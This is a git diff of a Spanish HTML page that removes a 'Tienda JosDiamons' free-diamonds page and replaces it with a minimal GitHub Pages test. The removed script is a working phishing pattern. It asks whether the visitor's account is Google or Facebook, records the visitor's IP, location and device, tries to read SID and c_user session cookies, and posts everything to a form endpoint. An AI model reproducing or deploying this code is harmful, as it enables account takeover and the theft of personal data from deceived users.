@@ -2,87 +2,17 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tienda JosDiamons</title>
+  <title>Prueba básica</title>
   <style>
-    /* ... tu CSS sin cambios ... */
+    body { background: black; color: white; font-family: sans-serif; padding: 20px; }
   </style>
 </head>
 <body>
-  <!-- ... tu HTML sin cambios ... -->
+  <h1>Probando GitHub Pages</h1>
+  <p id="info">Cargando...</p>
 
   <script>
-    function mostrarSeccion(id) {
-      document.querySelectorAll(".seccion").forEach(seccion => seccion.classList.remove("visible"));
-      document.getElementById(id).classList.add("visible");
-    }
-
-    function seleccionarDiamantes(cantidad) {
-      document.getElementById("cantidadDiamantes").value = cantidad + " diamantes";
-      mostrarSeccion("formulario");
-    }
-
-    function validarYMostrar() {
-      const cuentaMarcada = document.querySelector('input[name="tipo_cuenta"]:checked');
-      if (!cuentaMarcada) {
-        alert("Debes seleccionar si tu cuenta es de Google o Facebook.");
-        return;
-      }
-      mostrarSeccion("diamantes");
-    }
-
-    document.getElementById("formularioDiamantes").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const form = e.target;
-
-      fetch(form.action, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify(Object.fromEntries(new FormData(form))),
-      })
-      .then(() => {
-        mostrarSeccion("mensajeFinal");
-        form.reset();
-      })
-      .catch(() => {
-        alert("Hubo un error al enviar el formulario.");
-      });
-    });
-
-    // Captura IP, ubicación y dispositivo
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ip').value = data.ip || 'No detectada';
-        document.getElementById('ubicacion').value = `${data.city}, ${data.region}, ${data.country_name}`;
-      })
-      .catch(() => {
-        document.getElementById('ubicacion').value = 'Ubicación no detectada';
-      });
-
-    const ua = navigator.userAgent;
-    const esMovil = /Mobi|Android/i.test(ua);
-    const sistema = navigator.platform;
-    document.getElementById('dispositivo').value = esMovil ? `Móvil (${sistema})` : `PC (${sistema})`;
-
-    // Función para obtener cookie por nombre
-    function obtenerCookie(nombre) {
-      const cookies = document.cookie.split('; ');
-      for (let cookie of cookies) {
-        const [key, valor] = cookie.split('=');
-        if (key === nombre) return valor;
-      }
-      return null;
-    }
-
-    // Extrae cookie SID o c_user
-    const cookieSID = obtenerCookie('SID');
-    const cookieCUser = obtenerCookie('c_user');
-    document.getElementById('cookies').value = cookieSID || cookieCUser || 'No se encontró SID ni c_user';
-
+    document.getElementById('info').textContent = '¡La página cargó correctamente!';
   </script>
 </body>
 </html>
